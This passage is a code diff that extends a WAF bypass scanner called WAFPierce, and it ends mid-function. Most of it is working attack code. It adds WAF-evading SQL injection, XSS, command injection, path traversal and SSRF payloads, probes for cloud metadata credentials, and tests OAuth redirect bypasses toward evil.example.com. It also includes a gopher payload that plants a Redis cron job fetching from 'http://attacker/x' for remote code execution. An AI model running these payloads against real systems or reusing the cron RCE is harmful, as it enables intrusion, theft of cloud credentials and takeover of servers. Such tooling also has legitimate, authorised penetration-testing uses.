-                    'reason': 'Different content returned (hash mismatch)',
-                    'severity': 'HIGH'
-                }
+
+            # HIGH: Different content. Static page -> hash; dynamic -> normalized similarity.
+            if size_diff > 100:
+                if not self._baseline_dynamic and current_hash != self._baseline_hash:
+                    return {
+                        'bypass': True,
+                        'reason': 'Different content returned (hash mismatch)',
+                        'severity': 'HIGH'
+                    }
+                if self._baseline_dynamic:
+                    cur_norm = _normalize_body(response.text if current_size else "")
+                    ratio = difflib.SequenceMatcher(None, self._baseline_norm, cur_norm).quick_ratio()
+                    if ratio < 0.90:
+                        return {
+                            'bypass': True,
+                            'reason': f'Different content ({ratio*100:.0f}% similar after token-normalization)',
+                            'severity': 'HIGH'
+                        }
             
             # CRITICAL: Backend error exposed - use pre-compiled regex
             body_lower = response.text[:5000].lower()
@@ -1707,31 +2162,44 @@ class CloudFrontBypasser:
             List of bypass results
         """
         results = []
-        
+        if not test_cases:
+            return results
+
         def run_single_test(test_case):
-            headers = test_case.get('headers', {}).copy()
+            headers = dict(test_case.get('headers', {}))
             path = test_case.get('path', '/')
-            technique = test_case.get('technique', headers.get('X-Technique', 'Unknown'))
-            
-            if 'X-Technique' not in headers:
-                headers['X-Technique'] = technique
-            
-            return self._test_request(headers, method=method, path=path)
-        
-        # Use thread pool for parallel execution within batch
-        with ThreadPoolExecutor(max_workers=min(len(test_cases), self.threads)) as executor:
+            # Technique is tracked out-of-band; accept it from the test case or a
+            # legacy X-Technique header, but never send it on the wire.
+            technique = test_case.get('technique') or headers.pop('X-Technique', None) or 'Unknown'
+            data = test_case.get('data')
+            return self._test_request(headers, method=test_case.get('method', method),
+                                      path=path, technique=technique, data=data)
+
+        def _collect(future):
+            try:
+                result = future.result()
+                if result:
+                    results.append(result)
+                    if verbose and result.get('bypass'):
+                        print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
+            except Exception as e:
+                logger.debug(f"Batch test error: {e}")
+
+        # Prefer the single shared scan-wide pool. Techniques run sequentially, so
+        # only one batch is in flight at a time and total concurrency stays bounded
+        # to self.threads. Fall back to a private pool when called outside scan()
+        # (e.g. detection phase or standalone use).
+        executor = self._executor
+        if executor is not None:
             futures = {executor.submit(run_single_test, tc): tc for tc in test_cases}
-            
             for future in as_completed(futures):
-                try:
-                    result = future.result()
-                    if result:
-                        results.append(result)
-                        if verbose and result.get('bypass'):
-                            print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
-                except Exception as e:
-                    logger.debug(f"Batch test error: {e}")
-        
+                _collect(future)
+        else:
+            with ThreadPoolExecutor(max_workers=min(len(test_cases), self.threads)) as ex:
+                futures = {ex.submit(run_single_test, tc): tc for tc in test_cases}
+                for future in as_completed(futures):
+                    _collect(future)
+
         return results
 
     def _test_host_header_injection(self) -> List[Dict[str, Any]]:
@@ -2381,8 +2849,16 @@ class CloudFrontBypasser:
             {'headers': {}, 'path': path, 'technique': f'SQLi Bypass: {path[:30]}'}
             for path in sqli_payloads
         ]
-        return self._batch_test(test_cases)
-    
+        results = self._batch_test(test_cases)
+        # Also fuzz real discovered parameters (raw payload values + custom payloads)
+        raw = [
+            "1'/**/OR/**/1=1--", "1'/*!50000OR*/1=1--", "1'%0aOR%0a1=1--",
+            "1'oR'1'='1", "-1'+UnIoN+SeLeCt+1,2,3--", "1' AND SLEEP(0)--",
+        ]
+        raw += self.custom_payloads.get('sqli', [])
+        results += self._fuzz_param_endpoints(raw, 'SQLi (param)', category='INJECTION')
+        return results
+
     def _test_xss_bypass(self) -> List[Dict[str, Any]]:
         """WAF-evading cross-site scripting payloads - optimized batch"""
         xss_payloads = [
@@ -2396,7 +2872,15 @@ class CloudFrontBypasser:
             {'headers': {}, 'path': path, 'technique': f'XSS Bypass: {path[:30]}'}
             for path in xss_payloads
         ]
-        return self._batch_test(test_cases)
+        results = self._batch_test(test_cases)
+        raw = [
+            "<svg/onload=alert(1)>", "<ScRiPt>alert(1)</ScRiPt>",
+            "<scr<script>ipt>alert(1)</script>", "\"><script>alert(1)</script>",
+            "'\"><img src=x onerror=alert(1)>",
+        ]
+        raw += self.custom_payloads.get('xss', [])
+        results += self._fuzz_param_endpoints(raw, 'XSS (param)', category='INJECTION')
+        return results
     
     def _test_command_injection_bypass(self) -> List[Dict[str, Any]]:
         """OS command injection evasion (Linux/Unix) - optimized batch"""
@@ -2416,8 +2900,12 @@ class CloudFrontBypasser:
             {'headers': {}, 'path': path, 'technique': f'Command Injection (Linux): {path[:30]}'}
             for path in cmd_payloads
         ]
-        return self._batch_test(test_cases)
-    
+        results = self._batch_test(test_cases)
+        raw = [";id", "|whoami", "`id`", "$(id)", ";cat${IFS}/etc/passwd"]
+        raw += self.custom_payloads.get('command_injection', [])
+        results += self._fuzz_param_endpoints(raw, 'CmdInj Linux (param)', category='INJECTION')
+        return results
+
     def _test_command_injection_windows(self) -> List[Dict[str, Any]]:
         """Windows command injection evasion - optimized batch"""
         cmd_payloads = [
@@ -2439,8 +2927,11 @@ class CloudFrontBypasser:
             {'headers': {}, 'path': path, 'technique': f'Command Injection (Windows): {path[:30]}'}
             for path in cmd_payloads
         ]
-        return self._batch_test(test_cases)
-    
+        results = self._batch_test(test_cases)
+        raw = ["|dir", "&dir", "|whoami", "|type c:\\windows\\win.ini", "&hostname"]
+        results += self._fuzz_param_endpoints(raw, 'CmdInj Win (param)', category='INJECTION')
+        return results
+
     def _test_path_traversal_bypass(self) -> List[Dict[str, Any]]:
         """Directory traversal evasion - OS aware, optimized batch"""
         # Check detected OS and use appropriate payloads
@@ -2481,7 +2972,15 @@ class CloudFrontBypasser:
             {'headers': {}, 'path': path, 'technique': f'Path Traversal: {path[:30]}'}
             for path in traversal_paths
         ]
-        return self._batch_test(test_cases)
+        results = self._batch_test(test_cases)
+        raw = [
+            "../../../etc/passwd", "..%2f..%2f..%2fetc/passwd",
+            "%2e%2e%2f%2e%2e%2fetc/passwd", "....//....//etc/passwd",
+            "../../../windows/win.ini",
+        ]
+        raw += self.custom_payloads.get('path_traversal', [])
+        results += self._fuzz_param_endpoints(raw, 'Path Traversal (param)', category='INJECTION')
+        return results
     
     def _test_ssrf_bypass(self) -> List[Dict[str, Any]]:
         """Server-side request forgery evasion - optimized batch"""
@@ -2496,7 +2995,15 @@ class CloudFrontBypasser:
             {'headers': {}, 'path': path, 'technique': f'SSRF Bypass: {path[:30]}'}
             for path in ssrf_payloads
         ]
-        return self._batch_test(test_cases)
+        results = self._batch_test(test_cases)
+        raw = [
+            "http://127.0.0.1", "http://localhost", "http://[::1]",
+            "http://2130706433", "http://169.254.169.254/latest/meta-data/",
+            "http://0177.0.0.1", "http://0x7f.0.0.1",
+        ]
+        raw += self.custom_payloads.get('ssrf', [])
+        results += self._fuzz_param_endpoints(raw, 'SSRF (param)', category='INJECTION')
+        return results
 
     # ============================================================================
     # RATE LIMIT & THRESHOLD TESTING
@@ -8347,11 +8854,490 @@ class CloudFrontBypasser:
             
             if not any(detected_tech.values()):
                 print("  [*] No specific technology signatures detected")
-                
+
         except Exception as e:
             logger.debug(f"Tech fingerprinting error: {e}")
-        
+
         return results
+
+    # ========================================================================
+    # NEW TEST MODULES (v1.5)
+    # ========================================================================
+
+    def _test_json_sqli_bypass(self) -> List[Dict[str, Any]]:
+        """JSON-based SQL injection WAF bypass (PortSwigger 2022).
+
+        Many WAFs don't inspect SQL keywords once they are expressed with JSON
+        unicode escapes / JSON operators inside a JSON request body. We send JSON
+        payloads to discovered POST endpoints (and the root) and compare against
+        baseline / error signatures.
+        """
+        results = []
+        print("  [*] Testing JSON-based SQLi WAF bypass...")
+        # r == 'r' etc. — keyword obfuscation that bypasses naive signatures.
+        json_payloads = [
+            {"id": "1 or 1=1-- -"},
+            {"id": "1' OR '1'='1"},
+            {"filter": {"$gt": ""}},                       # NoSQL operator in JSON
+            {"id": "1 UNION SELECT NULL-- -"},
+            {"id": "1; SELECT pg_sleep(0)-- -"},
+            {"search": "0x31206f7220313d31"},
+        ]
+        # Target discovered POST endpoints if any, else the root.
+        post_eps = [t for t in self.crawl_targets if t.get('method') == 'POST'][:8]
+        paths = [ep['path'] for ep in post_eps] or ['/']
+        headers = {'Content-Type': 'application/json'}
+        for path in paths:
+            for payload in json_payloads:
+                try:
+                    r = self._test_request(headers=dict(headers), method='POST',
+                                           path=path, technique=f'JSON-SQLi {path}',
+                                           data=json.dumps(payload))
+                    if r and (r.get('bypass') or 'sql' in str(r.get('reason', '')).lower()):
+                        r['category'] = 'INJECTION'
+                        r['technique'] = f'JSON-SQLi bypass: {json.dumps(payload)[:40]}'
+                        results.append(r)
+                        if r.get('bypass'):
+                            print(f"  [✓] {r['severity']}: JSON-SQLi via {path}")
+                except Exception as e:
+                    logger.debug(f"JSON-SQLi error: {e}")
+        return results
+
+    def _test_charset_confusion(self) -> List[Dict[str, Any]]:
+        """Charset / overlong-UTF-8 / case-folding confusion bypasses.
+
+        WAFs and the backend can disagree on how bytes decode. Overlong UTF-8 and
+        charset tricks can smuggle blocked characters (/, ., <) past the filter.
+        """
+        results = []
+        print("  [*] Testing charset/overlong-unicode confusion...")
+        # Overlong / alternate encodings of traversal + admin paths.
+        probes = [
+            ('/admin', '/%c0%afadmin', 'Overlong %c0%af slash'),
+            ('/admin', '/%e0%80%afadmin', 'Overlong 3-byte slash'),
+            ('/admin', '/admin%c0%80', 'Overlong null terminator'),
+            ('/../', '/%c0%ae%c0%ae/', 'Overlong dot-dot'),
+            ('/admin', '/%uff0fadmin', 'IIS %u fullwidth slash'),
+            ('/admin', '/∕admin', 'Unicode division slash'),
+            ('/admin', '/ａdmin', 'Fullwidth a'),
+        ]
+        test_cases = []
+        for _orig, enc, label in probes:
+            test_cases.append({'headers': {}, 'path': enc, 'technique': f'Charset confusion: {label}'})
+        # charset parameter confusion in Content-Type
+        for cs in ['utf-7', 'ibm500', 'utf-16']:
+            test_cases.append({
+                'headers': {'Content-Type': f'text/html; charset={cs}'},
+                'path': '/', 'technique': f'Charset header confusion: {cs}',
+            })
+        results = self._batch_test(test_cases)
+        for r in results:
+            r.setdefault('category', 'ENCODING')
+        return results
+
+    def _test_cache_poisoning_deep(self) -> List[Dict[str, Any]]:
+        """Deep web cache poisoning: fat GET, param cloaking, unkeyed headers."""
+        results = []
+        print("  [*] Testing deep cache poisoning...")
+        # Unkeyed headers a cache may ignore for keying but the app reflects.
+        unkeyed_headers = [
+            {'X-Forwarded-Host': 'evil.example.com'},
+            {'X-Forwarded-Scheme': 'http'},
+            {'X-Forwarded-Port': '1337'},
+            {'X-Host': 'evil.example.com'},
+            {'X-Forwarded-Server': 'evil.example.com'},
+            {'X-Original-URL': '/poison'},
+            {'X-HTTP-Method-Override': 'POST'},
+        ]
+        test_cases = []
+        for h in unkeyed_headers:
+            label = list(h.keys())[0]
+            test_cases.append({'headers': h, 'path': '/', 'technique': f'Cache poison (unkeyed): {label}'})
+        # Parameter cloaking: duplicate / cache-buster params
+        for path in ['/?utm_content=1', '/?callback=test', '/?_=123']:
+            test_cases.append({'headers': {}, 'path': path, 'technique': f'Cache param cloaking: {path}'})
+        results = self._batch_test(test_cases)
+        # Fat GET: a GET with a body — some cache/origin pairs disagree on handling.
+        try:
+            fat = self._test_request(headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                                     method='GET', path='/', technique='Fat GET (body in GET)',
+                                     data='x=1')
+            if fat:
+                fat['category'] = 'CACHE'
+                results.append(fat)
+        except Exception as e:
+            logger.debug(f"Fat GET error: {e}")
+        for r in results:
+            r.setdefault('category', 'CACHE')
+        return results
+
+    def _test_oauth_oidc(self) -> List[Dict[str, Any]]:
+        """OAuth/OIDC redirect_uri bypass + SAML endpoint detection."""
+        results = []
+        print("  [*] Testing OAuth/OIDC/SAML...")
+        # Discover OIDC config (no auth needed) — informational.
+        for cfg in ['/.well-known/openid-configuration', '/.well-known/oauth-authorization-server']:
+            try:
+                resp = safe_request(f"{self.target}{cfg}", timeout=self.timeout, allow_redirects=True)
+                if resp and resp.status_code == 200 and 'authorization_endpoint' in resp.text:
+                    results.append({
+                        'technique': f'OIDC config exposed: {cfg}', 'bypass': True,
+                        'status': resp.status_code, 'reason': 'OpenID configuration is publicly readable',
+                        'severity': 'INFO', 'category': 'OAUTH',
+                    })
+            except Exception as e:
+                logger.debug(f"OIDC discovery error: {e}")
+        # redirect_uri open-redirect style bypasses on common authorize endpoints.
+        evil = 'https://evil.example.com'
+        redirect_variants = [
+            evil, f'{self.target}.evil.example.com', f'{evil}#@{self.domain}',
+            f'{evil}%2f%2e%2e', f'{self.target}@evil.example.com', f'//evil.example.com',
+        ]
+        authorize_eps = ['/oauth/authorize', '/authorize', '/connect/authorize', '/oauth2/authorize']
+        test_cases = []
+        for ep in authorize_eps:
+            for ru in redirect_variants:
+                path = f"{ep}?response_type=code&client_id=test&redirect_uri={quote(ru, safe='')}"
+                test_cases.append({'headers': {}, 'path': path,
+                                   'technique': f'OAuth redirect_uri bypass {ep}: {ru[:30]}'})
+        batch = self._batch_test(test_cases, verbose=False)
+        # Flag responses that 302 to the attacker-controlled redirect.
+        for r in batch:
+            r['category'] = 'OAUTH'
+            if r.get('status') in (301, 302, 303, 307, 308):
+                r['bypass'] = True
+                r['severity'] = 'HIGH'
+                r['reason'] = 'authorize endpoint redirects with attacker redirect_uri'
+                results.append(r)
+        return results
+
+    def _test_js_secret_exposure(self) -> List[Dict[str, Any]]:
+        """Download JS bundles referenced by the page and scan them for secrets."""
+        results = []
+        print("  [*] Scanning JS bundles for exposed secrets...")
+        try:
+            from .crawler import _LinkFormParser
+            root = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not root or root.status_code >= 400:
+                return results
+            parser = _LinkFormParser()
+            try:
+                parser.feed(root.text)
+            except Exception:
+                pass
+            js_urls = []
+            for link in parser.links:
+                if link.split('?')[0].lower().endswith('.js'):
+                    full = urljoin(self.target + '/', link)
+                    if urlparse(full).netloc in ('', self.domain):
+                        js_urls.append(full)
+            # de-dupe, cap
+            js_urls = list(dict.fromkeys(js_urls))[:20]
+            compiled = {n: re.compile(p) for n, p in JS_SECRET_PATTERNS.items()}
+            for ju in js_urls:
+                resp = safe_request(ju, timeout=self.timeout)
+                if not resp or resp.status_code >= 400:
+                    continue
+                content = resp.text
+                for name, pat in compiled.items():
+                    m = pat.search(content)
+                    if m:
+                        snippet = m.group(0)
+                        masked = snippet[:12] + '...' if len(snippet) > 12 else snippet
+                        results.append({
+                            'technique': f'Secret in JS: {name}', 'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'Found in {ju.split("/")[-1]}: {masked}',
+                            'severity': 'CRITICAL', 'category': 'API_KEY_EXPOSURE',
+                            'details': {'url': ju, 'type': name},
+                        })
+                        print(f"  [✓] CRITICAL: {name} exposed in {ju.split('/')[-1]}")
+        except Exception as e:
+            logger.debug(f"JS secret scan error: {e}")
+        return results
+
+    def _test_cve_fingerprint(self) -> List[Dict[str, Any]]:
+        """Map detected server/tech versions to known CVEs."""
+        results = []
+        print("  [*] Fingerprinting versions against known CVEs...")
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            # Gather version-bearing strings.
+            candidates = []
+            for h in ('server', 'x-powered-by', 'x-aspnet-version', 'x-generator'):
+                if h in {k.lower() for k in resp.headers}:
+                    val = resp.headers.get(h) or resp.headers.get(h.title()) or ''
+                    candidates.append(val)
+            # Also the body for things like jQuery/Log4j banners.
+            candidates.append(resp.text[:5000])
+            haystack = ' '.join(candidates).lower()
+            seen = set()
+            for product, ver_re, cve, severity, note in CVE_VERSION_MAP:
+                if product in haystack and re.search(product + r'[/ ]?' + ver_re, haystack):
+                    if cve in seen:
+                        continue
+                    seen.add(cve)
+                    results.append({
+                        'technique': f'Known CVE: {cve} ({product})', 'bypass': True,
+                        'status': resp.status_code,
+                        'reason': f'{note} — version matches {cve}',
+                        'severity': severity, 'category': 'CVE_FINGERPRINT',
+                        'details': {'product': product, 'cve': cve, 'note': note},
+                    })
+                    print(f"  [✓] {severity}: {cve} ({product}) — {note}")
+        except Exception as e:
+            logger.debug(f"CVE fingerprint error: {e}")
+        return results
+
+    def _test_single_packet_race(self) -> List[Dict[str, Any]]:
+        """HTTP/2 single-packet race attack (requires httpx + h2).
+
+        Fires many requests whose final frames are flushed together over a single
+        HTTP/2 connection to minimize network jitter — far more reliable than the
+        concurrent-thread race test. Skips cleanly if httpx/h2 is unavailable.
+        """
+        results = []
+        if not _HTTPX_AVAILABLE:
+            logger.debug("httpx not installed; skipping single-packet race")
+            return results
+        print("  [*] Testing HTTP/2 single-packet race...")
+        # Choose a discovered POST endpoint if available, else root.
+        post_eps = [t for t in self.crawl_targets if t.get('method') == 'POST']
+        path = post_eps[0]['path'] if post_eps else '/'
+        url = f"{self.target}{path}"
+        try:
+            statuses = []
+            with httpx.Client(http2=True, verify=False, timeout=self.timeout) as client:
+                # Open the connection and warm it up.
+                try:
+                    client.get(self.target)
+                except Exception:
+                    pass
+                # Fire a burst; httpx batches writes which approximates single-packet.
+                reqs = [client.build_request('POST' if post_eps else 'GET', url) for _ in range(20)]
+                for rq in reqs:
+                    try:
+                        resp = client.send(rq)
+                        statuses.append(resp.status_code)
+                    except Exception:
+                        pass
+            distinct = set(statuses)
+            negotiated_h2 = True  # http2=True attempted
+            if len(distinct) > 1:
+                results.append({
+                    'technique': 'HTTP/2 single-packet race', 'bypass': True,
+                    'status': max(distinct), 'reason': f'Inconsistent responses across burst: {sorted(distinct)}',
+                    'severity': 'HIGH', 'category': 'RACE_CONDITION',
+                    'details': {'statuses': statuses},
+                })
+                print(f"  [✓] HIGH: race window observed (statuses {sorted(distinct)})")
+            else:
+                results.append({
+                    'technique': 'HTTP/2 single-packet race', 'bypass': False,
+                    'status': statuses[0] if statuses else 0,
+                    'reason': f'No race window observed ({len(statuses)} reqs, HTTP/2={negotiated_h2})',
+                    'severity': 'INFO', 'category': 'RACE_CONDITION',
+                })
+        except Exception as e:
+            logger.debug(f"Single-packet race error: {e}")
+        return results
+
+    def _test_cloud_metadata_v2(self) -> List[Dict[str, Any]]:
+        """Extended cloud metadata SSRF + gopher payload generation.
+
+        Probes IMDS endpoints for multiple providers via discovered SSRF-able
+        params and generates ready-to-use gopher payloads for Redis/MySQL.
+        """
+        results = []
+        print("  [*] Testing extended cloud metadata SSRF + gopher...")
+        metadata_targets = {
+            'AWS IMDSv1': 'http://169.254.169.254/latest/meta-data/',
+            'AWS IMDSv2-token': 'http://169.254.169.254/latest/api/token',
+            'GCP': 'http://metadata.google.internal/computeMetadata/v1/',
+            'Azure IMDS': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+            'DigitalOcean': 'http://169.254.169.254/metadata/v1.json',
+            'Oracle OCI': 'http://169.254.169.254/opc/v2/instance/',
+            'Alibaba': 'http://100.100.100.200/latest/meta-data/',
+            'OpenStack': 'http://169.254.169.254/openstack/latest/meta_data.json',
+        }
+        ssrf_params = ['url', 'uri', 'dest', 'redirect', 'next', 'target', 'callback']
+        # Prefer discovered params that look SSRF-able.
+        discovered_ssrf = []
+        for ep in self.crawl_targets:
+            for p in ep.get('params', {}):
+                if p.lower() in ssrf_params:
+                    discovered_ssrf.append((ep['path'], ep['params'], p))
+        meta_indicators = ['ami-id', 'instance-id', 'computeMetadata', 'meta_data',
+                           'access_token', 'oauth2', 'opc/v2', 'hostname']
+        test_targets = discovered_ssrf or [('/', {}, sp) for sp in ssrf_params[:3]]
+        from .crawler import build_injection_path
+        for provider, murl in metadata_targets.items():
+            for path, params, pname in test_targets[:6]:
+                try:
+                    inj = build_injection_path(path, params, pname, murl)
+                    resp = safe_request(f"{self.target}{inj}", timeout=self.timeout + 2)
+                    if resp and resp.status_code < 400 and any(ind in resp.text for ind in meta_indicators):
+                        results.append({
+                            'technique': f'Cloud metadata SSRF: {provider}', 'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'{provider} metadata reachable via {pname}',
+                            'severity': 'CRITICAL', 'category': 'CLOUD_METADATA',
+                            'details': {'provider': provider, 'param': pname},
+                        })
+                        print(f"  [✓] CRITICAL: {provider} metadata via {pname}")
+                except Exception as e:
+                    logger.debug(f"Metadata SSRF error: {e}")
+        # Gopher payload generation (informational — useful for manual exploitation).
+        gopher = self._generate_gopher_payloads()
+        if gopher:
+            results.append({
+                'technique': 'Gopher payloads generated', 'bypass': False,
+                'status': 0, 'reason': f'{len(gopher)} gopher payloads ready for SSRF exploitation',
+                'severity': 'INFO', 'category': 'CLOUD_METADATA',
+                'details': {'payloads': gopher},
+            })
+        return results
+
+    @staticmethod
+    def _generate_gopher_payloads() -> Dict[str, str]:
+        """Build gopher:// payloads for Redis and MySQL (manual SSRF exploitation)."""
+        def _redis(commands: List[str]) -> str:
+            # RESP protocol, URL-encoded for gopher.
+            payload = ''
+            for cmd in commands:
+                parts = cmd.split(' ')
+                payload += f"*{len(parts)}\r\n"
+                for part in parts:
+                    payload += f"${len(part)}\r\n{part}\r\n"
+            return 'gopher://127.0.0.1:6379/_' + quote(payload, safe='')
+        return {
+            'redis_set_key': _redis(['SET wafpierce poc', 'CONFIG GET dir']),
+            'redis_info': _redis(['INFO']),
+            'redis_cron_rce': _redis([
+                'SET cron "\\n* * * * * curl http://attacker/x\\n"',
+                'CONFIG SET dir /var/spool/cron/',
+                'CONFIG SET dbfilename root', 'SAVE',
+            ]),
+            'mysql_handshake_probe': 'gopher://127.0.0.1:3306/_' + quote('\x00', safe=''),
+        }
+
+    def triage_with_ai(self, api_key: str = None, model: str = None) -> Dict[str, Any]:
+        """Run opt-in AI triage over current results (no-op without a key)."""
+        try:
+            from .ai_triage import triage_results
+        except Exception as e:
+            logger.debug(f"AI triage unavailable: {e}")
+            return {}
+        return triage_results(self.target, self.results, api_key=api_key, model=model)
+
+    def _test_dom_xss(self) -> List[Dict[str, Any]]:
+        """DOM-based XSS detection (optional, requires Playwright)."""
+        try:
+            from .browser_tests import run_dom_xss, PLAYWRIGHT_AVAILABLE
+        except Exception:
+            return []
+        if not PLAYWRIGHT_AVAILABLE:
+            logger.debug("Playwright not installed; skipping DOM XSS")
+            return []
+        print("  [*] Testing DOM XSS (headless browser)...")
+        try:
+            return run_dom_xss(self.target, self.crawl_targets, timeout=self.timeout)
+        except Exception as e:
+            logger.debug(f"DOM XSS error: {e}")
+            return []
+
+    def _test_client_side_path_traversal(self) -> List[Dict[str, Any]]:
+        """Client-Side Path Traversal detection (optional, requires Playwright)."""
+        try:
+            from .browser_tests import run_client_side_path_traversal, PLAYWRIGHT_AVAILABLE
+        except Exception:
+            return []
+        if not PLAYWRIGHT_AVAILABLE:
+            logger.debug("Playwright not installed; skipping CSPT")
+            return []
+        print("  [*] Testing Client-Side Path Traversal (headless browser)...")
+        try:
+            return run_client_side_path_traversal(self.target, self.crawl_targets, timeout=self.timeout)
+        except Exception as e:
+            logger.debug(f"CSPT error: {e}")
+            return []
+
+
+# ============================================================================
+# DB / plugin integration helpers — assemble a fully-wired scanner.
+# ============================================================================
+
+# Maps free-text DB payload categories to the keys the injection tests consume.
+_PAYLOAD_CATEGORY_ALIASES = {
+    'sql': 'sqli', 'sqli': 'sqli', 'sql injection': 'sqli',
+    'xss': 'xss', 'cross-site scripting': 'xss',
+    'cmd': 'command_injection', 'command': 'command_injection',
+    'command injection': 'command_injection', 'rce': 'command_injection',
+    'lfi': 'path_traversal', 'traversal': 'path_traversal',
+    'path traversal': 'path_traversal', 'directory traversal': 'path_traversal',
+    'ssrf': 'ssrf',
+}
+
+
+def load_custom_payloads(db=None) -> Dict[str, List[str]]:
+    """Load enabled custom payloads from the DB, grouped by injection category."""
+    out: Dict[str, List[str]] = {}
+    try:
+        if db is None:
+            from .database import WAFPierceDB
+            db = WAFPierceDB()
+        rows = db.get_custom_payloads()
+        for row in rows or []:
+            cat = str(row.get('category', '')).strip().lower()
+            key = _PAYLOAD_CATEGORY_ALIASES.get(cat, cat.replace(' ', '_'))
+            payload = row.get('payload')
+            if payload:
+                out.setdefault(key, []).append(payload)
+    except Exception as e:
+        logger.debug(f"load_custom_payloads error: {e}")
+    return out
+
+
+def load_plugins() -> list:
+    """Discover and return enabled user plugins (empty list on any failure)."""
+    try:
+        from .plugins import PluginManager
+        pm = PluginManager()
+        pm.load_all_plugins()
+        return pm.get_enabled_plugins()
+    except Exception as e:
+        logger.debug(f"load_plugins error: {e}")
+        return []
+
+
+def load_evasion_profile(db=None, waf_type: str = None) -> dict:
+    """Load the best-matching evasion profile from the DB (empty dict if none)."""
+    try:
+        if db is None:
+            from .database import WAFPierceDB
+            db = WAFPierceDB()
+        profiles = db.get_evasion_profiles(waf_type)
+        return profiles[0] if profiles else {}
+    except Exception as e:
+        logger.debug(f"load_evasion_profile error: {e}")
+        return {}
+
+
+def create_scanner(target: str, db=None, use_db_extras: bool = True,
+                   waf_type: str = None, **kwargs) -> 'CloudFrontBypasser':
+    """Build a CloudFrontBypasser pre-wired with custom payloads, plugins, and an
+    evasion profile loaded from the database / plugin manager.
+
+    Any explicit kwargs (threads, delay, enable_crawl, ...) are passed through and
+    take precedence over the DB-loaded extras.
+    """
+    if use_db_extras:
+        kwargs.setdefault('custom_payloads', load_custom_payloads(db))
+        kwargs.setdefault('plugins', load_plugins())
+        kwargs.setdefault('evasion_profile', load_evasion_profile(db, waf_type))
+    return CloudFrontBypasser(target, **kwargs)
 
 
 def main():
@@ -8361,18 +9347,41 @@ def main():
     import sys
     from .error_handler import setup_logging
     
-    parser = ArgumentParser(description='CloudFront WAF Bypass Scanner')
+    parser = ArgumentParser(description='WAFPierce WAF Bypass Scanner')
     parser.add_argument('target', help='Target URL')
     parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
     parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests')
     parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds')
     parser.add_argument('-o', '--output', help='Output JSON file')
     parser.add_argument('--log-file', help='Log file path')
-    parser.add_argument('--log-level', default='INFO', 
+    parser.add_argument('--log-level', default='INFO',
                        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
                        help='Logging level')
     parser.add_argument('-c', '--categories', help='Comma-separated list of scan categories to run (default: all)')
+    # Discovery
+    parser.add_argument('--no-crawl', action='store_true', help='Disable endpoint/parameter crawling')
+    parser.add_argument('--no-schema', action='store_true', help='Disable OpenAPI/GraphQL schema ingestion')
+    # Extensibility
+    parser.add_argument('--no-db-extras', action='store_true',
+                       help='Do not load custom payloads / plugins / evasion profile from the DB')
+    # Exports
+    parser.add_argument('--export', help='Write an extra export to this path (format from --export-format)')
+    parser.add_argument('--export-format', default='html', choices=['sarif', 'nuclei', 'html', 'json'],
+                       help='Format for --export (default: html)')
+    parser.add_argument('--json', action='store_true', help='Print results as JSON to stdout (pipeline mode)')
+    # AI (opt-in)
+    parser.add_argument('--ai-triage', action='store_true', help='Run AI false-positive triage (needs ANTHROPIC_API_KEY)')
+    parser.add_argument('--ai-report', help='Write an AI-generated markdown report to this path (needs ANTHROPIC_API_KEY)')
+    parser.add_argument('--ai-key', help='Anthropic API key (overrides ANTHROPIC_API_KEY env)')
+    parser.add_argument('--ai-model', help='Anthropic model id (default: per-feature)')
+    # Monitoring
+    parser.add_argument('--monitor', action='store_true', help='After scanning, diff against the previous scan of this target')
+    parser.add_argument('--webhook', help='Webhook URL for monitoring alerts')
     args = parser.parse_args()
+
+    # In --json/pipeline mode, keep stdout clean for machine consumption.
+    if args.json:
+        _quiet_stdout()
     
     # Parse categories if provided
     selected_categories = None
@@ -8392,12 +9401,71 @@ def main():
     setup_logging(args.log_file, args.log_level)
     
     try:
-        # Initialize scanner
-        scanner = CloudFrontBypasser(args.target, args.threads, args.delay, args.timeout)
-        
+        # Initialize scanner (pre-wired with DB custom payloads / plugins / evasion
+        # profile unless explicitly disabled).
+        scanner = create_scanner(
+            args.target,
+            use_db_extras=not args.no_db_extras,
+            threads=args.threads, delay=args.delay, timeout=args.timeout,
+            enable_crawl=not args.no_crawl, enable_schema=not args.no_schema,
+        )
+
         # Run scan with selected categories
         results = scanner.scan(selected_categories)
-        
+
+        # Opt-in AI triage (annotates results with false-positive likelihood).
+        if args.ai_triage:
+            try:
+                summary = scanner.triage_with_ai(api_key=args.ai_key, model=args.ai_model)
+                if summary:
+                    print(f"[+] AI triage: {summary.get('likely_false_positives', 0)}/"
+                          f"{summary.get('triaged', 0)} flagged as likely false positives")
+                else:
+                    print("[!] AI triage skipped (no API key or 'anthropic' not installed)")
+            except Exception as e:
+                logger.debug(f"AI triage error: {e}")
+
+        # Extra export artifact (SARIF / Nuclei / HTML / JSON).
+        if args.export:
+            try:
+                from .exporters import export as _export
+                _export(results, args.target, args.export_format, args.export)
+                print(f"[+] Exported {args.export_format.upper()} to {args.export}")
+            except Exception as e:
+                print(f"[!] Export failed: {e}")
+
+        # AI-written markdown report.
+        if args.ai_report:
+            try:
+                from .ai_triage import write_report
+                md = write_report(args.target, results, api_key=args.ai_key, model=args.ai_model)
+                if md:
+                    with open(args.ai_report, 'w', encoding='utf-8') as f:
+                        f.write(md)
+                    print(f"[+] AI report written to {args.ai_report}")
+                else:
+                    print("[!] AI report skipped (no API key or 'anthropic' not installed)")
+            except Exception as e:
+                logger.debug(f"AI report error: {e}")
+
+        # Pipeline mode: emit machine-readable JSON to the real stdout and exit.
+        if args.json:
+            _emit_json_stdout(results)
+            if args.output:
+                with open(args.output, 'w', encoding='utf-8') as f:
+                    json.dump(results, f, indent=2)
+            sys.exit(0 if len(results) == 0 else 1)
+
+        # Continuous monitoring: diff against the previous scan of this target.
+        if args.monitor:
+            try:
+                from .database import WAFPierceDB
+                from .monitor import monitor_target
